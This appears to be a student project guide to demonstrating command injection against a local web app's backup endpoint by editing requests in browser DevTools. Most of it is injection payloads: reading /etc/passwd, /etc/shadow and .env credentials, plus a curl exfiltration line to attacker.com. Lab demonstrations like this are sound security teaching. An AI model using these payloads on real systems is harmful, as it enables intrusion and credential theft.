# Command Injection Enumeration Guide
## How to Test and View Command Output via Network Inspector

This guide shows how to enumerate command injection vulnerabilities and view the results in the browser's Network Inspector.

---

## 🔍 Testing Command Injection via Network Inspector

### Method 1: Using Browser DevTools

#### Step 1: Open Network Inspector
1. Open your browser (Chrome/Firefox/Edge)
2. Press **F12** to open DevTools
3. Click on the **Network** tab
4. Make sure **Preserve log** is checked

#### Step 2: Intercept the Request
1. Go to admin dashboard: `http://localhost:3000/admin/home`
2. Click **"Run System Backup"** button
3. In Network tab, find the request to `/api/backup`
4. Click on it to view details

#### Step 3: View the Response
1. Click on the **Response** tab
2. You'll see the JSON response containing:
   ```json
   {
     "success": true,
     "command": "tar -cvf site_data.tar .",
     "filename": "site_data.tar",
     "output": "...",
     "exitCode": 0
   }
   ```

#### Step 4: Modify Request for Command Injection
1. Right-click on the `/api/backup` request
2. Select **"Edit and Resend"** (Chrome) or **"Edit and Resend"** (Firefox)
3. Modify the request body:
   ```json
   {
     "filename": "site_data.tar; whoami"
   }
   ```
4. Click **Send**
5. View the new response - you'll see:
   ```json
   {
     "success": true,
     "command": "tar -cvf site_data.tar; whoami .",
     "filename": "site_data.tar; whoami",
     "output": "current_user\n",
     "exitCode": 0
   }
   ```

---

## 🧪 Command Injection Payloads to Test

### Basic Enumeration:

```json
// Test 1: System information
{"filename": "site_data.tar; whoami"}

// Test 2: Current directory
{"filename": "site_data.tar; pwd"}

// Test 3: List files
{"filename": "site_data.tar; ls -la"}

// Test 4: System info
{"filename": "site_data.tar; uname -a"}

// Test 5: Network info
{"filename": "site_data.tar; ifconfig"}
```

### Advanced Enumeration:

```json
// Test 6: Read system files
{"filename": "site_data.tar; cat /etc/passwd"}

// Test 7: Environment variables
{"filename": "site_data.tar; env"}

// Test 8: Process list
{"filename": "site_data.tar; ps aux"}

// Test 9: Network connections
{"filename": "site_data.tar; netstat -an"}

// Test 10: Database connection info
{"filename": "site_data.tar; cat ../.env"}
```

### Data Exfiltration:

```json
// Test 11: Exfiltrate data
{"filename": "site_data.tar; curl http://attacker.com/steal?data=$(whoami)"}

// Test 12: Base64 encode sensitive data
{"filename": "site_data.tar; cat /etc/passwd | base64"}
```

---

## 📊 What You'll See in Network Inspector

### Normal Request:
```json
Request URL: http://localhost:3000/api/backup
Request Method: POST
Request Payload:
{
  "filename": "site_data.tar"
}

Response:
{
  "success": true,
  "command": "tar -cvf site_data.tar .",
  "filename": "site_data.tar",
  "output": "tar: site_data.tar: Cannot open: Permission denied\n...",
  "exitCode": 1,
  "timestamp": "2024-01-15T10:30:00.000Z"
}
```

### Command Injection Request:
```json
Request URL: http://localhost:3000/api/backup
Request Method: POST
Request Payload:
{
  "filename": "site_data.tar; whoami"
}

Response:
{
  "success": true,
  "command": "tar -cvf site_data.tar; whoami .",
  "filename": "site_data.tar; whoami",
  "output": "tar: site_data.tar: Cannot open: Permission denied\nwww-data\n",
  "exitCode": 1,
  "timestamp": "2024-01-15T10:30:00.000Z"
}
```

**Notice:** The `whoami` command output (`www-data`) appears in the response!

---

## 🎯 Step-by-Step Enumeration Process

### Phase 1: Discovery
1. **Identify the endpoint:**
   - Found: `POST /api/backup`
   - Parameter: `filename`

2. **Test basic functionality:**
   - Send normal request
   - Check response structure
   - Verify command execution

### Phase 2: Injection Testing
1. **Test command separator:**
   ```json
   {"filename": "site_data.tar; echo test"}
   ```
   - Check if "test" appears in output

2. **Test system commands:**
   ```json
   {"filename": "site_data.tar; whoami"}
   ```
   - Check if username appears in output

3. **Test multiple commands:**
   ```json
   {"filename": "site_data.tar; whoami; pwd; ls -la"}
   ```
   - Check if all outputs appear

### Phase 3: Information Gathering
1. **System information:**
   ```json
   {"filename": "site_data.tar; uname -a"}
   {"filename": "site_data.tar; cat /etc/os-release"}
   ```

2. **User information:**
   ```json
   {"filename": "site_data.tar; whoami"}
   {"filename": "site_data.tar; id"}
   {"filename": "site_data.tar; cat /etc/passwd"}
   ```

3. **Network information:**
   ```json
   {"filename": "site_data.tar; ifconfig"}
   {"filename": "site_data.tar; netstat -an"}
   ```

4. **File system:**
   ```json
   {"filename": "site_data.tar; pwd"}
   {"filename": "site_data.tar; ls -la"}
   {"filename": "site_data.tar; find / -name '*.env' 2>/dev/null"}
   ```

### Phase 4: Data Extraction
1. **Configuration files:**
   ```json
   {"filename": "site_data.tar; cat ../.env"}
   {"filename": "site_data.tar; cat ../lib/db.js"}
   ```

2. **Database files:**
   ```json
   {"filename": "site_data.tar; find . -name '*.db' -o -name '*.sqlite'"}
   {"filename": "site_data.tar; cat data/products.json"}
   ```

3. **Sensitive data:**
   ```json
   {"filename": "site_data.tar; cat /etc/passwd"}
   {"filename": "site_data.tar; cat /etc/shadow"}  # If accessible
   ```

---

## 🔧 Using Browser DevTools

### Chrome/Edge:
1. **F12** → Network tab
2. Click request → **Payload** tab (see request)
3. Click request → **Response** tab (see output)
4. Right-click → **Copy** → **Copy response**

### Firefox:
1. **F12** → Network tab
2. Click request → **Params** tab (see request)
3. Click request → **Response** tab (see output)
4. Right-click → **Copy** → **Copy Response**

### Viewing JSON:
- Response is JSON - use **Pretty print** option
- Expand objects to see nested data
- Search for specific strings (Ctrl+F)

---

## 📝 Example Enumeration Session

### Step 1: Initial Test
```bash
# Request
POST /api/backup
{"filename": "site_data.tar"}

# Response (Network Inspector)
{
  "command": "tar -cvf site_data.tar .",
  "output": "tar: site_data.tar: Permission denied"
}
```

### Step 2: Command Injection Test
```bash
# Request (Modified in Network Inspector)
POST /api/backup
{"filename": "site_data.tar; whoami"}

# Response
{
  "command": "tar -cvf site_data.tar; whoami .",
  "output": "tar: site_data.tar: Permission denied\nwww-data\n"
}
```
✅ **Command injection confirmed!** Username `www-data` appears in output.

### Step 3: System Enumeration
```bash
# Request
POST /api/backup
{"filename": "site_data.tar; uname -a"}

# Response
{
  "command": "tar -cvf site_data.tar; uname -a .",
  "output": "...\nLinux server 5.4.0 #1 SMP ... x86_64 GNU/Linux\n"
}
```
✅ **System identified:** Linux, kernel 5.4.0

### Step 4: File System Access
```bash
# Request
POST /api/backup
{"filename": "site_data.tar; ls -la"}

# Response
{
  "command": "tar -cvf site_data.tar; ls -la .",
  "output": "...\ntotal 1234\ndrwxr-xr-x ...\n-rw-r--r-- package.json\n..."
}
```
✅ **Directory listing obtained**

### Step 5: Configuration Extraction
```bash
# Request
POST /api/backup
{"filename": "site_data.tar; cat ../.env"}

# Response
{
  "command": "tar -cvf site_data.tar; cat ../.env .",
  "output": "...\nDB_HOST=localhost\nDB_USER=root\nDB_PASSWORD=secret123\n..."
}
```
✅ **Database credentials extracted!**

---

## 🎯 Complete Attack Chain

### 1. Discover Vulnerability
- Found backup button in admin panel
- Identified `/api/backup` endpoint
- Tested command injection

### 2. Enumerate System
- Extracted username: `www-data`
- Identified OS: Linux
- Listed directory structure

### 3. Extract Credentials
- Read `.env` file
- Obtained database credentials
- Found configuration files

### 4. Escalate Access
- Use credentials to access database
- Extract all user data
- Gain full system control

---

## ✅ Checklist for Enumeration

- [ ] Test basic command injection (`; whoami`)
- [ ] Extract system information (`uname -a`)
- [ ] Extract user information (`whoami`, `id`)
- [ ] List directory structure (`ls -la`)
- [ ] Read configuration files (`.env`, `db.js`)
- [ ] Extract database credentials
- [ ] Read system files (`/etc/passwd`)
- [ ] Test network connectivity (`ifconfig`)
- [ ] Test data exfiltration
- [ ] Document all findings

---

## 📸 For Your FYP Demo

### Screenshot Checklist:
1. Network Inspector showing normal request
2. Network Inspector showing command injection request
3. Response showing command output
4. Multiple enumeration commands
5. Extracted credentials/data

### Demo Flow:
1. Show normal backup request
2. Modify request in Network Inspector
3. Show command injection payload
4. Show command output in response
5. Demonstrate enumeration
6. Show extracted data

The command output is now fully visible in the Network Inspector! 🎯
